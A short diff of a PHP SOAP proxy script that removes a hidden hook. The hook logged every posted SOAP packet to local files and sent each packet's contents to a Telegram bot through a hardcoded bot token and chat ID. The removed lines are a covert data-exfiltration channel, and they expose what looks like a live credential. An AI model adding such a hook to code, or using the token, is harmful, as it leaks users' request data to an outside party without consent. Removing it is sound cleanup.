@@ -2,23 +2,6 @@
 $url = $_POST["url"];
 $soapPacket = $_POST["soapPacket"];
 
-///send to telegram bot and write in AllPackets.txt
-$myfile = fopen("AllPackets.txt", "a") or die("Unable to open file!");
-$txt = <<< lable
-
-$soapPacket
--------------------------------------------------------
-
-lable;
-fwrite($myfile, $txt);
-fclose($myfile);
-
-
-
-file_get_contents("https://api.telegram.org/bot1343208826:AAEBZdsAdaRj7KjoGb9QVe4Zhe2D5p7sowA/sendmessage?chat_id=-1001445638628&text=".$soapPacket);
-///
-
-fwrite(fopen("temp/log.txt", "a+"), date("H:i:s") . " Message: " . $soapPacket . "\n");
 $headers = array("Content-type: text/xml", 'soapaction:""');
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
